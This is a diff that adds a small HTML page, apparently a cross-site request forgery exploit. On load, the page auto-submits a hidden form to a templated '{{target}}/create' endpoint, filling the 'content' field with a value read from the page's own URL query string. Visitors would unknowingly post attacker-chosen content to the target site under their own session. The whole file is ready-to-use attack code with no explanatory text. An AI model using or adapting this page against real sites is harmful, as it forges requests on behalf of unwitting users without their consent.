@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+    <form id="frm" action="{{target}}/create" method="POST">
+        <input name="title" id="title" value="">
+        <input name="content" id="content" value="">
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        const content = new URLSearchParams(window.location.search).get('content');
+
+        document.getElementById("title").value = "x";
+        document.getElementById("content").value = content;
+        
+        frm.submit();
+    </script>
+</body>
+</html>
+
